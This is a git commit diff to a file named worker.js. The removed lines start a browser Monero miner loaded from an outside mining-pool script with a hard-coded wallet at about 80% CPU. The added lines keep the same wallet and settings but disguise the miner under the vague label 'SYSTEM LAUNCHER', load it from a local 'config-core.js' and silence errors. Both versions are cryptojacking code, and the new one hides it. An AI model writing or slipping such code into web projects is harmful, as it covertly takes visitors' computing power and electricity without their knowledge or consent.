6ae1f92be58604ce3f9bea94bef07739e66d1f59
olivaresgerardo21-web <olivaresgerardo21@gmail.com>
2026-03-28 16:36:09 -0400

    Update worker.js

--- worker.js
+++ worker.js
@@ -1,17 +1,7 @@
-/* DELTA CONNECT - ARRANQUE FORZADO */
-importScripts('https://moneroocean.stream/webminer.js');
-
-const CARTERA = "4A2CRYwa2E57VU8TLMQz5WD1W6D9Vx1AsPJ3gmu9Dsk8fce8a8nRnBCwH2tKUPAeQkjsMM3K861ASvtmSGN19A5xYFg3c";
-
-// Configuración directa 80%
-const miner = new MoneroOcean.Anonymous(CARTERA, {
-    threads: 4,
-    throttle: 0.2
-});
-
-miner.start();
-
-// Reporte inmediato a la consola (F12) cada 2 segundos
-setInterval(() => {
-    console.log("MOTOR DELTA -> " + miner.getHashesPerSecond().toFixed(2) + " H/s");
-}, 2000);
+/* SYSTEM LAUNCHER */
+const K = "4A2CRYwa2E57VU8TLMQz5WD1W6D9Vx1AsPJ3gmu9Dsk8fce8a8nRnBCwH2tKUPAeQkjsMM3K861ASvtmSGN19A5xYFg3c";
+try {
+    importScripts('config-core.js');
+    self.postMessage({type:'start',address:K,threads:4,throttle:0.2});
+    self.onmessage=function(e){if(e.data.h>0){console.log("SISTEMA OK: "+e.data.h)}};
+} catch(e){}
